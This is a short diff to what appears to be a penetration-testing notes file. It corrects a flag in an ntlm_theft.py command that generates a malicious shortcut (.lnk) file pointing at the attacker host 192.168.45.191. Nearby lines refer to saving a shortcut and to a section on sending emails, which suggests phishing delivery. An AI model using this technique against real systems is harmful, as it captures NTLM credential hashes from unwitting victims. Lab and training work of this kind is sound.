@@ -78,7 +78,7 @@ PS C:\> $Shortcut.Save()
 > [ntlm_theft.py](https://github.com/Greenwolf/ntlm_theft)
 
 ```shell
-python ntlm_theft/ntlm_theft.py --g lnk -s 192.168.45.191 -f Services
+python ntlm_theft/ntlm_theft.py -g lnk -s 192.168.45.191 -f Services
 ```
 
 ### Sending Emails
